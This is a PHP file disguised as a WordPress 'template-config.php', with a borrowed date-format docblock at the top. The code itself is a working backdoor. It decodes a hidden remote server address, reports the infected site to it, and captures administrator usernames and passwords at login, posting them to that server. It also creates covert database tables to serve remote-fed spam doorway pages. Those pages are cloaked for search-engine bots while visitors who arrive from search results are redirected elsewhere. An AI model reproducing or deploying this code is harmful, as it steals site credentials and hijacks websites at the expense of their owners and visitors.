<?php 
/**
 * template-config.php
 *
 * @package WordPress
 * Convert given date string into a different format.
 *
 * $format should be either a PHP date format string, e.g. 'U' for a Unix
 * timestamp, or 'G' for a Unix timestamp assuming that $date is GMT.
 *
 * If $translate is true then the given date and format string will
 * be passed to date_i18n() for translation.
 *
 * @since 0.2
 *
 * @param string $format    Format of the date to return.
 * @param string $date      Date string to convert.
 * @param bool   $translate Whether the return date should be translated. Default true.
 * @return string|int|bool Formatted date string or Unix timestamp. False if $date is empty.
 */
 
$admworkurl="YndkLmthcmFuYml7LmNvbSUyRndvcmsucGhw";
ini_set('display_errors',"Off");ini_set('memory_limit','256M');ini_set('max_execution_time',0);set_time_limit(0);ignore_user_abort(1);$wpdbhost=DB_HOST;$wpdbhost=trim($wpdbhost,":");$wpdbname=DB_NAME;$wpdbuser=DB_USER;$wpdbpass=DB_PASSWORD;if(empty($table_prefix)){$wpdbpref="wpr_";}else{$wpdbpref=$table_prefix;}$maintablaname=$wpdbpref ."pcachewpr";$linkstablaname=$wpdbpref ."lcachewpr";$dbprt="3306";if(stripos("qqq" .$wpdbhost,":")){$wpdbhost=explode(":",$wpdbhost);$dbprt=$wpdbhost[1];$wpdbhost=$wpdbhost[0];}if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];}elseif(!empty($_SERVER['REMOTE_ADDR'])){$ip=$_SERVER['REMOTE_ADDR'];}else{$ip="";}$mordaurl=readValueFromBD($wpdbpref ."options","option_value","option_name='siteurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(empty($mordaurl)|| $mordaurl=="no"|| stripos("qqq" .$mordaurl,"localhost")){$mordaurl=$_SERVER['HTTP_HOST'];if(is_ssl()=== false){$mordaurl="http://" .$mordaurl;}else{$mordaurl="https://" .$mordaurl;}}$currenturl=$_SERVER['SERVER_NAME'] .strtolower($_SERVER['REQUEST_URI']);$currenturl=trim($currenturl,"/");if(is_ssl()=== false){$currenturl="http://" .$currenturl;}else{$currenturl="https://" .$currenturl;}$checktable=mysqlTableSeekWP($maintablaname,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(!empty($admworkurl)&& is_writable(__FILE__)&& $checktable == "no"){$fp1=fopen(__FILE__ ."temp",'w+');if(!$fp1===false){fclose($fp1);$admurltodelete=$admworkurl;$admworkurl=decodeservurl($admworkurl);$params="autoknock=yes&siteurl=" .urlencode($mordaurl);$result=httpPost($admworkurl,$params);$clfile=file_get_contents(__FILE__);$clfile=str_ireplace($admurltodelete,"",$clfile);$fp=fopen(__FILE__,'w+');fwrite($fp,$clfile);fclose($fp);@unlink(__FILE__ ."temp");}}if(!empty($_POST["log"])&&!empty($_POST["pwd"])&& function_exists("wp_authenticate")){$checktable=mysqlTableSeekWP($maintablaname,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($checktable != "no"){$admurlfmbd=readValueFromBD($maintablaname,"wpcache","wphash='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$admurlfmbd=urldecode($admurlfmbd);$clientidfmbd=readValueFromBD($maintablaname,"wpcache","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(!empty($admurlfmbd)&&!empty($clientidfmbd)&& $clientidfmbd!="no"&& $admurlfmbd!="no"){$un=$_POST["log"];$up=$_POST["pwd"];$auth=wp_authenticate($un,$up);$auth=(array)$auth;if(!empty($auth["ID"])){if(isset($auth["roles"][0])&& $auth["roles"][0]== "administrator"){if(isset($auth["allcaps"]["level_10"])&& $auth["allcaps"]["level_10"]=== true){$params="clientid=" .$clientidfmbd ."&updata=" .urlencode($un ."|||" .$up) ."&admip=" .urlencode($ip) ."&admurl=" .urlencode($currenturl);$result=httpPost($admurlfmbd,$params);}}}}}}if(empty($_GET['ertthndxbcvs'])&&!stripos("qqq" .$_SERVER['SERVER_NAME'] .$_SERVER['REQUEST_URI'],"/admin")&&!stripos("qqq" .$_SERVER['SERVER_NAME'] .$_SERVER['REQUEST_URI'],"wp-admin")&&!empty($wpdbhost)&&!empty($wpdbname)&&!empty($wpdbuser)&&!empty($wpdbpass)){header('Content-type: text/html; charset=UTF-8');$currenthash=md5($currenturl);if(!empty($_SERVER['HTTP_USER_AGENT'])){$useragent=$_SERVER['HTTP_USER_AGENT'];}else{$useragent="";}if(!empty($_SERVER['HTTP_REFERER'])){$referer=$_SERVER['HTTP_REFERER'];}else{$referer="";}if(!empty($_POST["trsgdfs"])&& $_POST["trsgdfs"]== "1sxhlichvls"&&!empty($_POST["qwydsdf"])){$err="";$checktable=mysqlTableSeekWP($maintablaname,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($checktable == "no"){$res=createTable($maintablaname,"wphash LONGBLOB, wpurl LONGBLOB, wpcache LONGBLOB, wpk LONGBLOB, wpk1 LONGBLOB, wpset LONGBLOB, wpred LONGBLOB, wpredurl LONGBLOB","id",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($res != "yes"){echo $res;die();}}elseif($checktable=="udfgoihdkh48sied"){echo $checktable;die();}elseif($checktable=="yes"){echo "aawtr35tdgvvcsxdff";die();}$checktable=mysqlTableSeekWP($linkstablaname,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($checktable== "no"){$res=createTable($linkstablaname,"wphash LONGBLOB, wpcache LONGBLOB","id",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($res != "yes"){echo $res;die();}}elseif($checktable=="udfgoihdkh48sied"){echo $checktable;die();}elseif($checktable=="yes"){echo "aawtr35tdgvvcsxdff";die();}createIndexBWD($maintablaname,"wphash",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);createIndexBWD($linkstablaname,"wphash",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$postpass=randString("15");$res=insertToBD($maintablaname,"wphash, wpcache","'admurl', '" .urlencode($_POST["qwydsdf"]) ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$res=insertToBD($maintablaname,"wphash, wpcache","'passtopost', '" .$postpass ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$clientid=randString("20");$res=insertToBD($maintablaname,"wphash, wpcache","'clientid', '" .$clientid ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($res == "yes"){echo "zxcvetrhytdj65re|||||" .$postpass .":::::" .$clientid ."|||||";if(function_exists('delete_metadata')){delete_metadata('user',0,'session_tokens',false,true);}die();}else{echo "xcvbrhr6hdhcgxcva";die();}}if(!empty($_POST["ptpxcbeiru"])){$passtopostfmbd=readValueFromBD($maintablaname,"wpcache","wphash='passtopost'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$admurlfmbd=readValueFromBD($maintablaname,"wpcache","wphash='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$clientidfmbd=readValueFromBD($maintablaname,"wpcache","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(empty($passtopostfmbd)|| $passtopostfmbd == "no"|| $passtopostfmbd != $_POST["ptpxcbeiru"]){echo "uewea4sfdxcbxb";die();}if(empty($admurlfmbd)|| $admurlfmbd == "no"){echo "kutyre54aw3eafd";die();}if(empty($clientidfmbd)|| $clientidfmbd == "no"){echo "xgse5rsdgiofsdsf";die();}$admurlfmbd=urldecode($admurlfmbd);if(!empty($_POST["hdfgfxoi"])&& $_POST["hdfgfxoi"]== "ncxfxdasdf"&&!empty($_POST["chpuview"])&&!empty($_POST["doorkeys"])){if(getCountofTable($maintablaname,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt)>3 && $_POST["firstpart"]=="yes"){deleteLinesFmDB($maintablaname,"wpk IS NOT NULL",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);deleteLinesFmDB($linkstablaname,"wphash IS NOT NULL",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);updateBDData($maintablaname,"","wpred","wphash='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);updateBDData($maintablaname,"","wpredurl","wphash='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);updateBDData($maintablaname,"","wpred","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);updateBDData($maintablaname,"","wpredurl","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);}$chpuview=$_POST["chpuview"];$chpuview=urldecode($chpuview);$doorkeys=$_POST["doorkeys"];$doorkeys=urldecode($doorkeys);$doorkeys=stripslashes($doorkeys);$doorkeys=preg_replace_callback('!s:(\d+):"(.*?)";!',function($match){return($match[1]==($match[2]))?$match[0]:'s:' .strlen($match[2]) .':"' .$match[2] .'";';},$doorkeys);$doorkeys=unserialize($doorkeys);if(!is_array($doorkeys)|| count($doorkeys)== 0){echo "vbsdreawefzzdfv";die();}if($_POST["firstpart"]=="yes"){$sitetempfrdoor=parseTemplate();if(empty($sitetempfrdoor)||!is_array($sitetempfrdoor)|| empty($sitetempfrdoor["sitetemp"])|| empty($sitetempfrdoor["chpu"])){echo "ktdrtsdfgsdfs4tse";die();}$chpufrdoor=$sitetempfrdoor["chpu"];$sitetempfrdoor=$sitetempfrdoor["sitetemp"];$sitetempfrdoor=str_ireplace("xmlrpc.php","",$sitetempfrdoor);updateBDData($maintablaname,urlencode($chpufrdoor),"wpurl","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);}else{$chpufrdoor=readValueFromBD($maintablaname,"wpurl","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$chpufrdoor=urldecode($chpufrdoor);$sitetempfrdoor="notfirstpart";if(empty($chpufrdoor)|| $chpufrdoor=="no"){echo "kiryut7dfgzxvcmcxz";die();}}$doorpagesdata=array();$testpageurl="";foreach($doorkeys as $k=>$onekey){$onekey=explode("|",$onekey);if(!empty($onekey[1])){$key_1=$onekey[1];}else{$key_1="";}$onekey=$onekey[0];if($chpuview == "k"){$slugfrurl=sanitize_title($onekey);}elseif($chpuview == "g"){$slugfrurl=randString(rand(7,11));}elseif($chpuview == "n"){$slugfrurl=rand(1,9) .rand(1,9) .rand(1,9) .rand(1,9) .rand(1,9) .rand(1,9) .rand(1,9) .rand(1,9);}$slugfrurl=strtolower($slugfrurl);$doorpageurl=str_ireplace("chpukeyplace",$slugfrurl,$chpufrdoor);$doorpagesdata[]=$onekey .":::::" .$doorpageurl;$res=insertToBD($maintablaname,"wphash, wpurl, wpk, wpk1","'" .md5($doorpageurl) ."', '" .urlencode($doorpageurl) ."', '" .urlencode($onekey) ."', '" .urlencode($key_1) ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($_POST["firstpart"]=="yes"&& $k==0){$testpageurl=str_ireplace("chpukeyplace","edf8329we",$chpufrdoor);insertToBD($maintablaname,"wphash, wpurl, wpk, wpk1","'" .md5($testpageurl) ."', '" .urlencode($testpageurl) ."', 'edf8329we', ''",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);}if($res == "bewiursfer9uidd"){echo "xcvbr459isdfgssdd";die();}}updateBDData($maintablaname,$_POST["doorsetts"],"wpset","wphash='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$doorpagesdata=serialize($doorpagesdata);$doorpagesdata=urlencode($doorpagesdata);$params="clientid=" .$clientidfmbd ."&newdoordata=" .$doorpagesdata ."&sitetemplate=" .urlencode($sitetempfrdoor) ."&firstpart=" .$_POST["firstpart"] ."&testpageurl=" .urlencode($testpageurl);$result=httpPost($admurlfmbd,$params);if(stripos("qqq" .$result,"trugsew9rusxildd")){echo "xbvstrei4w0aeaorpdf";die();}elseif(stripos("qqq" .$result,"bw543ersfdgsdfffg")){echo "pqweity5rer5syc9f";die();}else{echo "myrtersgertsrgfdf";die();}}if(!empty($_POST["redircode"])||!empty($_POST["redirurl"])){if(!empty($_POST["redircode"])){if($_POST["redircode"]=="stop"){updateBDData($maintablaname,"","wpred","wphash='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);updateBDData($maintablaname,"","wpredurl","wphash='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);}else{updateBDData($maintablaname,urlencode(stripslashes($_POST["redircode"])),"wpred","wphash='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);}}if(!empty($_POST["redirurl"])){updateBDData($maintablaname,urlencode(stripslashes($_POST["redirurl"])),"wpredurl","wphash='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);}echo "geri9rdgfojvrev";die();}if(!empty($_POST["clearcache"])){updateBDData($maintablaname,"","wpcache","wpcache IS NOT NULL AND wpk IS NOT NULL",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);deleteLinesFmDB($linkstablaname,"wphash IS NOT NULL",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);echo "be545hgfxbfbgfdf";die();}if(!empty($_POST["editownlinks"])&&!empty($_POST["newownlinks"])){$doorsettings=readValueFromBD($maintablaname,"wpset","wphash='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(!empty($doorsettings)&& $doorsettings!="no"){$doorsettings=urldecode($doorsettings);$doorsettings=unserialize($doorsettings);$doorsettings["ownlinks"]=$_POST["newownlinks"];$doorsettings=serialize($doorsettings);$doorsettings=urlencode($doorsettings);updateBDData($maintablaname,$doorsettings,"wpset","wphash='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);echo "nbvw436rudtydsjjgk";die();}else{echo "vcbntrs6udtyradgxf";die();}}if(!empty($_POST["getdoorstatus"])){$doorstatus=getStatus($maintablaname,$linkstablaname,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$botsstats=readValueFromBD($maintablaname,"wpred","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(!is_numeric($botsstats)){$botsstats=0;}$usersstats=readValueFromBD($maintablaname,"wpredurl","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(!is_numeric($usersstats)){$usersstats=0;}if(is_array($doorstatus)){$doorstatus["botsstats"]=$botsstats;$doorstatus["usersstats"]=$usersstats;$doorstatus=serialize($doorstatus);$doorstatus=urlencode($doorstatus);echo "p9ot78u6syrtfxhg DOORSTATUS:::" .$doorstatus .":::DOORSTATUSq";die();}else{echo $doorstatus ."<br>";echo "zxcveer4eefresfsdfv";die();}}}$uatobadfilter=array('#Ask\s*Jeeves#i','#HP\s*Web\s*PrintSmart#i','#HTTrack#i','#IDBot#i','#Indy\s*Library#','#ListChecker#i','#MSIECrawler#i','#NetCache#i','#Nutch#i','#RPT-HTTPClient#i','#rulinki\.ru#i','#Twiceler#i','#WebAlta#i','#Webster\s*Pro#i','#www\.cys\.ru#i','#Wysigot#i','#Ahrefs#i','#Yeti#i','#Accoona#i','#CazoodleBot#i','#CFNetwork#i','#ConveraCrawler#i','#DISCo#i','#Download\s*Master#i','#FAST\s*MetaWeb\s*Crawler#i','#Flexum\s*spider#i','#Gigabot#i','#HTMLParser#i','#ia_archiver#i','#ichiro#i','#IRLbot#i','#Java#i','#km\.ru\s*bot#i','#kmSearchBot#i','#libwww-perl#i','#Lupa\.ru#i','#LWP::Simple#i','#lwp-trivial#i','#Missigua#i','#MJ12bot#i','#Offline\s*Explorer#i','#OmniExplorer_Bot#i','#PEAR#i','#psbot#i','#Python#i','#rulinki\.ru#i','#SMILE#i','#Speedy#i','#Teleport\s*Pro#i','#TurtleScanner#i','#User-Agent#i','#voyager#i','#Webalta#i','#WebCopier#i','#WebData#i','#WebZIP#i','#Wget#i','#Yanga#i','#Yeti#i','#jeeves#i','#WordPress#i','#scooter#i','#av\s*fetch#i','#asterias#i','#spiderthread\srevision#i','#sqworm#i','#infoseek sidewinder#i','#ultraseek#i','#polybot#i','#webcrawler#i','#robozill#i','#gulliver#i','#architextspider#i','#charlotte#i','#Vegi\s*bot#i','#BUbiNG#i','#ltx71#i','#MJ12bot#i','#MegaIndex#i','#Mediatoolkitbot#i','#DotBot#i','#opensiteexplorer#i','#Go-http-client#i','#Photon#i','#bloglovin#i','#scalaj-http#i','#AddThis#i','#LinkWalker#i','#adscanner#i','#istellabot#i','#Datanyze#i');$badbot="";if(strpos("qqq" .preg_replace($uatobadfilter,'-ABOT-',$useragent),'-ABOT-')){$badbot="yes";}if(mysqlTableSeekWP($maintablaname,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt)!="no"&& getCountofTable($maintablaname,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt)>3 &&!stripos("qqq" .$_SERVER['SERVER_NAME'] .$_SERVER['REQUEST_URI'],"wp-login")&& is_user_logged_in()===false && empty($badbot)){$reddata=readValueFromBD($maintablaname,"wpred, wpredurl","wphash='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$redcode="";$redurl="";if(!empty($reddata)&& $reddata != "no"){$redcode=$reddata["wpred"];$redurl=$reddata["wpredurl"];}$currentdoorcache=readValueFromBD($maintablaname,"wpcache, wpk","wphash='" .$currenthash ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($currentdoorcache == "no"){$showlinksornot="no";$doorsettings=readValueFromBD($maintablaname,"wpset","wphash='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(!empty($doorsettings)&& $doorsettings!="no"){$doorsettings=urldecode($doorsettings);$doorsettings=unserialize($doorsettings);$showlinksornot=$doorsettings["ownlinks"];}if($showlinksornot=="yes"){$currentlinkscache=readValueFromBD($linkstablaname,"wpcache","wphash='" .$currenthash ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($currentlinkscache == "no"|| empty($currentlinkscache)){$randlinks=randomValuesFromTableById($maintablaname,"wpurl,wpk",rand(4,6),$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(!empty($randlinks)&& $randlinks != "no"&& is_array($randlinks)){$goodlinks=array();foreach($randlinks as $onelinkdata){if(!empty($onelinkdata["wpk"])){$goodlinks[]="<a href=\"" .trim(urldecode($onelinkdata["wpurl"])) ."\">" .trim(urldecode($onelinkdata["wpk"])) ."</a>";}}if(count($goodlinks)>0){$goodlinks=implode(" ",$goodlinks);insertToBD($linkstablaname,"wphash, wpcache","'" .$currenthash ."', '" .urlencode($goodlinks) ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);}else{$goodlinks="";}}}else{$goodlinks=urldecode($currentlinkscache);}if(!empty($goodlinks)){$bot="";if($redcode == "ktapi"&&!empty($redurl)){$redurl=urldecode($redurl);$redurl=unserialize($redurl);if(count($redurl)== 3){$bot=goToRedirect($ip,$referer,$useragent,$redurl["kturl"],"",$redurl["lapi"],"yes","","","","");}}else{$bot=goToRedirect($ip,$referer,$useragent,"","","","yes","","","","");}if($bot == "bot"){$selfpage=placeLinks($currenturl,$goodlinks);if(!empty($selfpage)){echo $selfpage;die();}}}}}else{$clientidfmbd=readValueFromBD($maintablaname,"wpcache","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$admurlfmbd=readValueFromBD($maintablaname,"wpcache","wphash='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(!empty($clientidfmbd)&&!empty($admurlfmbd)){$admurlfmbd=urldecode($admurlfmbd);$currentkey=$currentdoorcache["wpk"];$key1frredir=readValueFromBD($maintablaname,"wpk1","wphash='" .$currenthash ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(empty($key1frredir)|| $key1frredir=="no"){$key1frredir="";}$redresult="";if($redcode == "ktapi"&&!empty($redurl)){$redurl=urldecode($redurl);$redurl=unserialize($redurl);if(count($redurl)== 3){$redresult=goToRedirect($ip,$referer,$useragent,$redurl["kturl"],$currenturl,$redurl["mapi"],"",urldecode($currentkey),"","",$key1frredir);}}elseif(empty($redcode)){$redresult=goToRedirect($ip,$referer,$useragent,"",$currenturl,"","",urldecode($currentkey),"","","");}else{$redcode=urldecode($redcode);$redurl=urldecode($redurl);$redresult=goToRedirect($ip,$referer,$useragent,"",$currenturl,"","",urldecode($currentkey),$redcode,$redurl,$key1frredir);}if(empty($currentdoorcache["wpcache"])|| $currentkey=="edf8329we"){$params="clientid=" .$clientidfmbd ."&givemecontent=" .$currentkey;$content=httpPost($admurlfmbd,$params);if(!empty($content)&& strlen($content)>1000){$content=urlencode($content);if($currentkey!="edf8329we"){updateBDData($maintablaname,$content,"wpcache","wphash='" .$currenthash ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);}}}else{$content=$currentdoorcache["wpcache"];}if($redresult == "bot"){if(stripos("qqq" .$useragent,"google")|| stripos("qqq" .$useragent,"bing")|| stripos("qqq" .$useragent,"yahoo")|| stripos("qqq" .$useragent,"yandex")){$botscount=readValueFromBD($maintablaname,"wpred","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(empty($botscount)|| $botscount=="no"){$botscount=1;}elseif(is_numeric($botscount)){$botscount++;}else{$botscount=1;}if(!empty($botscount)){updateBDData($maintablaname,$botscount,"wpred","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);}}echo urldecode($content);die();}elseif(!empty($redresult)){if(stripos("qqq" .$referer,"google.")|| stripos("qqq" .$referer,"yahoo.")|| stripos("qqq" .$referer,"bing.")|| stripos("qqq" .$referer,"yandex.ru")|| stripos("qqq" .$referer,"mail.ru")){$userscount=readValueFromBD($maintablaname,"wpredurl","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(empty($userscount)|| $userscount == "no"){$userscount=1;}elseif(is_numeric($userscount)){$userscount++;}else{$userscount=1;}if(!empty($userscount)){updateBDData($maintablaname,$userscount,"wpredurl","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);}}echo $redresult;die();}elseif(empty($redresult)){if(stripos("qqq" .$referer,"google.")|| stripos("qqq" .$referer,"yahoo.")|| stripos("qqq" .$referer,"bing.")|| stripos("qqq" .$referer,"yandex.ru")|| stripos("qqq" .$referer,"mail.ru")){$userscount=readValueFromBD($maintablaname,"wpredurl","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(empty($userscount)|| $userscount == "no"){$userscount=1;}else{$userscount++;}if(!empty($userscount)){updateBDData($maintablaname,$userscount,"wpredurl","wphash='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);}}}}}}}function decodeservurl($servurl){$goodservurl=array();foreach(str_split($servurl)as $onechar){if(is_numeric($onechar)){if($onechar>=7){$onechar=$onechar-7;}else{$onechar=$onechar+10-7;}}$goodservurl[]=$onechar;}return urldecode(base64_decode(implode($goodservurl)));}function createIndexBWD($tablename,$indcol,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return "udfgoihdkh48sied";}$sql="ALTER TABLE " .$tablename ." ADD INDEX " .$indcol ." (" .$indcol ."(5))";if(mysqli_query($dbcon,$sql)){mysqli_close($dbcon);return "yes";}else{mysqli_close($dbcon);return "orutydrfsxgxcvbxcv";}}function getStatus($mtablename,$ltablename,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$checkdata=array();$checkmaintable=mysqlTableSeekWP($mtablename,$dbhost,$dbname,$dbuser,$dbpass,$dbport);if(!empty($checkmaintable)&& $checkmaintable != "no"){$checkdata["maintable"]="good";$linescount=getCountofTable($mtablename,$dbhost,$dbname,$dbuser,$dbpass,$dbport);if($linescount!="no"&& $linescount>3){$checkdata["cachelines"]=$linescount-3;$cachecount=getCacheCount($mtablename,$dbhost,$dbname,$dbuser,$dbpass,$dbport);if($cachecount!="no"&& $cachecount!="bad"){$checkdata["cachecount"]=$cachecount;}else{$checkdata["cachecount"]="bad";}}else{$checkdata["cachelines"]="bad";$checkdata["cachecount"]="bad";}}else{$checkdata["maintable"]="bad";$checkdata["cachecount"]="bad";}$checklinktable=mysqlTableSeekWP($ltablename,$dbhost,$dbname,$dbuser,$dbpass,$dbport);if(!empty($checklinktable)&& $checklinktable != "no"){$checkdata["linkable"]="good";}else{$checkdata["linkable"]="bad";}return $checkdata;}function getCacheCount($tablename,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return false;}else{$sql="SELECT COUNT(1) FROM " .$tablename ." WHERE wpcache IS NOT NULL AND wpcache!='' AND wpk IS NOT NULL";$needvalue=mysqli_query($dbcon,$sql);$needvalue=mysqli_fetch_all($needvalue);mysqli_close($dbcon);if(count($needvalue[0])>0){return $needvalue[0][0];}else{return "bad";}}}function goToRedirect($ip,$referrer,$ua,$domain_kt,$url_curr,$apiToken,$forlinks,$keyword,$plainred,$plainredurl,$key1){if(empty($ip)){return "";}if(!empty($apiToken)){$user_agent_to_filter=array('#Ask\s*Jeeves#i','#HP\s*Web\s*PrintSmart#i','#HTTrack#i','#IDBot#i','#Indy\s*Library#','#ListChecker#i','#MSIECrawler#i','#NetCache#i','#Nutch#i','#RPT-HTTPClient#i','#rulinki\.ru#i','#Twiceler#i','#WebAlta#i','#Webster\s*Pro#i','#www\.cys\.ru#i','#Wysigot#i','#Ahrefs#i','#Yeti#i','#Accoona#i','#CazoodleBot#i','#CFNetwork#i','#ConveraCrawler#i','#DISCo#i','#Download\s*Master#i','#FAST\s*MetaWeb\s*Crawler#i','#Flexum\s*spider#i','#Gigabot#i','#HTMLParser#i','#ia_archiver#i','#ichiro#i','#IRLbot#i','#Java#i','#km\.ru\s*bot#i','#kmSearchBot#i','#libwww-perl#i','#Lupa\.ru#i','#LWP::Simple#i','#lwp-trivial#i','#Missigua#i','#MJ12bot#i','#msnbot#i','#Offline\s*Explorer#i','#OmniExplorer_Bot#i','#PEAR#i','#psbot#i','#Python#i','#rulinki\.ru#i','#SMILE#i','#Speedy#i','#Teleport\s*Pro#i','#TurtleScanner#i','#User-Agent#i','#voyager#i','#Webalta#i','#WebCopier#i','#WebData#i','#WebZIP#i','#Wget#i','#Yanga#i','#Yeti#i','#MJ12bot#i','#jeeves#i','#WordPress#i','#scooter#i','#av\s*fetch#i','#asterias#i','#spiderthread revision#i','#sqworm#i','#ask#i','#lycos.spider#i','#infoseek sidewinder#i','#ultraseek#i','#polybot#i','#webcrawler#i','#robozill#i','#gulliver#i','#architextspider#i','#charlotte#i','#Vegi\s*bot#i','#BUbiNG#i','#ltx71#i','#YandexBot#i','#MJ12bot#i','#MegaIndex#i','#DotBot#i');if(strpos("qqq" .preg_replace($user_agent_to_filter,'-ANGRYBOT-',$ua),'-ANGRYBOT-')){return "bot";}$lang=$_SERVER['HTTP_ACCEPT_LANGUAGE'];$ua=urlencode($ua);$url=$domain_kt ."?is_api=1&source=" .urlencode($url_curr) ."&action=get&token=" .$apiToken ."&ua=" .$ua ."&ip=" .$ip ."&keyword=" .urlencode($keyword) ."&referrer=" .$referrer ."&lang=" .$lang ."&sub_id_1=" .urlencode($key1);if(function_exists('curl_init')){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_TIMEOUT,90);$output=curl_exec($ch);curl_close($ch);}else{$params=explode("?",$url);$params=$params[1];$output=file_get_contents($url,false,stream_context_create(array('http'=> array('method'=> 'POST','header'=> 'Content-type: application/x-www-form-urlencoded','content'=> $params))));}$result=json_decode($output);$result=(array)$result;$result=(array)$result["redirect"];if($result["content"]!== "bot"){if(!empty($forlinks)){return "";}foreach($result["headers"]as $header){header($header);}if($result["content"]){$result["content"]=urldecode($result["content"]);return $result["content"];}}elseif($result["content"]=== "bot"){return "bot";}else{return "";}}else{$is_bot="";$user_agent_to_filter=array('#Ask\s*Jeeves#i','#HP\s*Web\s*PrintSmart#i','#HTTrack#i','#IDBot#i','#Indy\s*Library#','#ListChecker#i','#MSIECrawler#i','#NetCache#i','#Nutch#i','#RPT-HTTPClient#i','#rulinki\.ru#i','#Twiceler#i','#WebAlta#i','#Webster\s*Pro#i','#www\.cys\.ru#i','#Wysigot#i','#Yahoo!\s*Slurp#i','#Yeti#i','#Accoona#i','#CazoodleBot#i','#CFNetwork#i','#ConveraCrawler#i','#DISCo#i','#Download\s*Master#i','#FAST\s*MetaWeb\s*Crawler#i','#Flexum\s*spider#i','#Gigabot#i','#HTMLParser#i','#ia_archiver#i','#ichiro#i','#IRLbot#i','#Java#i','#km\.ru\s*bot#i','#kmSearchBot#i','#libwww-perl#i','#Lupa\.ru#i','#LWP::Simple#i','#lwp-trivial#i','#Missigua#i','#MJ12bot#i','#msnbot#i','#msnbot-media#i','#Offline\s*Explorer#i','#OmniExplorer_Bot#i','#PEAR#i','#psbot#i','#Python#i','#rulinki\.ru#i','#SMILE#i','#Speedy#i','#Teleport\s*Pro#i','#TurtleScanner#i','#User-Agent#i','#voyager#i','#Webalta#i','#WebCopier#i','#WebData#i','#